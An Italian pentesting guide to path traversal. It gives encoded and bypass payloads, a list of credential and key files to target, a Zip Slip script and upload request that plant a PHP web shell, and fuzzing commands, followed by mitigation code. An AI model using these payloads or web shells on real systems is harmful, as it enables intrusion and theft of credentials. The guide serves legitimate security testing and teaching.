# Path Traversal

## Scopo

Questa guida copre le vulnerabilità Path Traversal (Directory Traversal), che permettono di accedere a file e directory al di fuori della root dell'applicazione.

## Prerequisiti

- Conoscenza filesystem Linux/Windows
- Burp Suite
- **Autorizzazione per testing**

---

## Concetto

```
Applicazione costruisce path con input utente
senza validazione adeguata

Vulnerabile:
file = open("/var/www/files/" + user_input)

Input: ../../../etc/passwd
Path: /var/www/files/../../../etc/passwd = /etc/passwd
```

---

## Vettori Comuni

### Parametri URL

```
http://target/download?file=report.pdf
http://target/download?file=../../../etc/passwd
```

### Form/POST

```
filename=../../../etc/passwd
path=..%2f..%2f..%2fetc/passwd
```

### Headers

```
Cookie: lang=../../../etc/passwd
X-Custom-Header: ../../../etc/passwd
```

### File Upload Path

```
POST /upload
filename="../../../var/www/html/shell.php"
```

---

## Payloads Base

### Linux

```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
..%c0%af..%c0%afetc/passwd
```

### Windows

```
..\..\..\windows\system32\drivers\etc\hosts
..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
..%255c..%255c..%255cwindows%5csystem32%5cdrivers%5cetc%5chosts
....\\....\\....\\windows\\system32\\drivers\\etc\\hosts
```

---

## Bypass Tecniche

### Encoding

| Originale | URL Encoded | Double Encoded |
|-----------|-------------|----------------|
| `.` | `%2e` | `%252e` |
| `/` | `%2f` | `%252f` |
| `\` | `%5c` | `%255c` |
| `..` | `%2e%2e` | `%252e%252e` |

### Null Byte

```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd\x00
```

### Path Normalization

```
....//....//....//etc/passwd
..../\..../\..../\etc/passwd
....\/....\/....\/etc/passwd
```

### Unicode/UTF-8

```
..%c0%af..%c0%afetc/passwd
..%c1%9c..%c1%9cetc/passwd
%uff0e%uff0e%u2215
```

### Wrapper

```
file:///etc/passwd
file://localhost/etc/passwd
```

---

## File Target

### Linux

```
# Sistema
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/hostname
/etc/resolv.conf
/etc/crontab

# Apache
/etc/apache2/apache2.conf
/var/log/apache2/access.log
/var/log/apache2/error.log

# Nginx
/etc/nginx/nginx.conf
/var/log/nginx/access.log

# SSH
/home/user/.ssh/id_rsa
/home/user/.ssh/authorized_keys
/root/.ssh/id_rsa

# Applicazione
/var/www/html/config.php
/var/www/html/.env
/proc/self/environ
```

### Windows

```
# Sistema
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM
C:\Windows\win.ini
C:\Windows\System32\config\SYSTEM

# IIS
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\

# Apache/XAMPP
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log

# Utente
C:\Users\<user>\Desktop\
C:\Users\<user>\.ssh\id_rsa
```

---

## Detection Burp Suite

### Intruder

```
1. Intercetta request con parametro file
2. Send to Intruder
3. Imposta payload position
4. Carica wordlist path traversal
5. Filtra per response length diverso
```

### Active Scan

```
- Burp Scanner rileva automaticamente
- Verifica Issue Definitions
```

---

## Exploitation Avanzata

### Zip Slip

```
# File zip malevolo con path traversal
import zipfile

zf = zipfile.ZipFile('malicious.zip', 'w')
zf.writestr("../../../var/www/html/shell.php", "<?php system($_GET['c']); ?>")
zf.close()
```

### Upload + Traversal

```
# Nome file con traversal
filename="../../uploads/shell.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
```

### Reading Source Code

```
# Leggi configurazione applicazione
../../../var/www/html/config.php
../../../var/www/html/.env
../../../app/config/database.yml
```

---

## Automazione

### ffuf

```bash
ffuf -u "http://target/download?file=FUZZ" \
    -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
    -mc 200 \
    -fs 0
```

### wfuzz

```bash
wfuzz -c -z file,/path/to/lfi-list.txt \
    --hl 0 \
    "http://target/download?file=FUZZ"
```

---

## Mitigazioni

### Whitelist

```python
ALLOWED_FILES = ['report.pdf', 'manual.pdf', 'guide.pdf']

def download(filename):
    if filename not in ALLOWED_FILES:
        return "Access denied", 403
    return send_file(f"/var/www/files/{filename}")
```

### Basename

```python
import os

def download(filename):
    # Rimuove path, mantiene solo filename
    safe_name = os.path.basename(filename)
    return send_file(f"/var/www/files/{safe_name}")
```

### Realpath Check

```python
import os

BASE_DIR = "/var/www/files"

def download(filename):
    full_path = os.path.realpath(os.path.join(BASE_DIR, filename))
    
    if not full_path.startswith(BASE_DIR):
        return "Access denied", 403
    
    return send_file(full_path)
```

### Chroot/Jail

```
- Isola processo in directory specifica
- Previene accesso a filesystem esterno
```

---

## Best Practices

- **Wordlist**: Usa SecLists o simili
- **Context**: Adatta payload per OS
- **Encoding**: Prova multiple encoding
- **Escalation**: Cerca file con credenziali
- **Report**: Documenta tutti i file accessibili

## Riferimenti

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PortSwigger Directory Traversal](https://portswigger.net/web-security/file-path-traversal)
- [SecLists LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
